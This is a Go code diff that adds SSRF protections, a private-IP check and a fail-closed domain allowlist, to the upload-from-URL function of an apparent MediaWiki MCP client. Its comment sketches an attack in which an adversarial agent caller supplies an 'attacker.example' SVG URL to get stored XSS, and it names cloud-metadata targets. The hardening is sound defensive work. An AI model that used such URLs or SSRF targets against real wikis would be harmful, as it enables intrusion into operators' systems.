@@ -615,8 +615,33 @@ func (c *Client) performUpload(ctx context.Context, args UploadFileArgs) (Upload
 	return c.uploadFromFile(ctx, args, token)
 }
 
-// uploadFromURL uploads a file from a URL
+// uploadFromURL uploads a file from a URL.
+//
+// SECURITY (HG-3): two independent gates protect the upload-from-URL path
+// from being used as a server-side request forgery primitive against the
+// wiki's network neighbors:
+//
+//  1. validateFileURL refuses URLs whose host (or any DNS-resolved IP)
+//     is private/internal — protects against wiki-as-SSRF-proxy targeting
+//     169.254.169.254 (cloud metadata), RFC1918 ranges, link-local, etc.
+//  2. validateUploadDomain refuses any host not present on the operator's
+//     positive allowlist (MEDIAWIKI_UPLOAD_ALLOWED_DOMAINS). Fail-closed
+//     when unset — the wiki is the entity performing the fetch on the
+//     bot's behalf, and the agent caller is fully URL-controlling, so
+//     the operator must explicitly enumerate trusted source hosts.
+//
+// Without these gates, an adversarial MCP caller could pass
+// args.FileURL = "https://attacker.example/poisoned.svg" and have the
+// wiki fetch it (and on wikis that allow SVG, this becomes stored XSS
+// via the bot account when ignore_warnings overwrites an existing file).
 func (c *Client) uploadFromURL(ctx context.Context, args UploadFileArgs, token string) (UploadFileResult, error) {
+	if err := validateFileURL(args.FileURL); err != nil {
+		return UploadFileResult{}, err
+	}
+	if err := validateUploadDomain(args.FileURL); err != nil {
+		return UploadFileResult{}, err
+	}
+
 	params := url.Values{}
 	params.Set("action", "upload")
 	params.Set("filename", args.Filename)
